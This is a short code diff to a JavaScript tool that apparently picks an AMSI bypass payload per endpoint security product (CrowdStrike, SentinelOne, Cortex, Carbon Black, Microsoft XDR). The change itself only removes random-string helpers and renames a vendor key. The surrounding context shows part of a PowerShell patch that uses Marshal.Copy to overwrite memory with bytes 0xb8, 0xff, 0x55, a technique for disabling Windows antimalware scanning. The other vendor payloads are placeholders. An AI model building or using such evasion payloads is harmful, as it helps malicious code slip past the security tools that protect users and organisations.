@@ -1,18 +1,3 @@
-// Generate a random string of specified length
-function randomString(length) {
-    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-}
-
-// Generate a random integer between 0 and max (inclusive)
-function randomInt(max) {
-    return Math.floor(Math.random() * (max + 1));
-}
-
 function getPayload(edr) {
     
     // EDR-specific payloads
@@ -48,7 +33,7 @@ if ($s -eq 8) {
 } else {
     [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0xff, 0x55), 0, $emh, 3)
 }`;
-    const microsoftXDRPayload = `#MicrosoftXDR AMSI Bypass (Placeholder)`;
+    const microsoftXDRPayload = `#Microsoft-XDR AMSI Bypass (Placeholder)`;
     const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder)`;
     const cortexPayload = `#Cortex AMSI Bypass (Placeholder)`;
     const carbonBlackPayload = `#carbonBlack AMSI Bypass (Placeholder)`;
@@ -56,7 +41,7 @@ if ($s -eq 8) {
     switch (edr) {
         case 'CrowdStrike':
             return crowdStrikePayload;
-        case 'MicrosoftXDR':
+        case 'Microsoft-XDR':
             return microsoftXDRPayload;
         case 'SentinelOne':
             return sentinelOnePayload;
